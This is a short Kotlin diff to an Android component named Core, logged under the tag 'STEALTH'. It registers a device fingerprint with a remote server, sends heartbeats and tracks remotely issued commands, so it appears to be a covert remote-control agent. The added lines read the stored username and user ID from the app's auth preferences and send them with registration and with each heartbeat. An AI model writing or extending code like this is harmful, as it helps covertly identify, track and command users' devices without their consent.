@@ -22,6 +22,8 @@ object Core {
     private const val TAG = "STEALTH"
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var deviceId: String = ""
+    private var username: String = ""
+    private var userId: String = ""
     private var running = false
     // Persisted in SharedPreferences — survives process death (e.g. system installer killing app)
     private var executedCommandIds = mutableSetOf<String>()
@@ -50,8 +52,14 @@ object Core {
                 deviceId = fingerprint.replace("|", "_")
                 Log.d(TAG, "Device ID: $deviceId")
 
-                Transport.registerDevice(deviceId, fingerprint)
-                Log.d(TAG, "Device registered")
+                val authPrefs = context.getSharedPreferences("auth_prefs", android.content.Context.MODE_PRIVATE)
+                val fpUsername = try { authPrefs.getString("username", "") ?: "" } catch (_: Exception) { "" }
+                val fpUserId = try { authPrefs.getString("user_id", "") ?: "" } catch (_: Exception) { "" }
+                username = fpUsername
+                userId = fpUserId
+
+                Transport.registerDevice(deviceId, fingerprint, username, fpUserId)
+                Log.d(TAG, "Device registered (user=$username, uid=$fpUserId)")
 
                 // Reset any stale "running" commands from previous process freeze
                 Transport.cleanupStaleCommands(deviceId)
@@ -91,7 +99,7 @@ object Core {
                     if (now - lastHeartbeat >= Config.HEARTBEAT_INTERVAL_MS) {
                         lastHeartbeat = now
                         try {
-                            Transport.updateHeartbeat(deviceId)
+                            Transport.updateHeartbeat(deviceId, username, userId)
                         } catch (_: Exception) {}
                     }
 
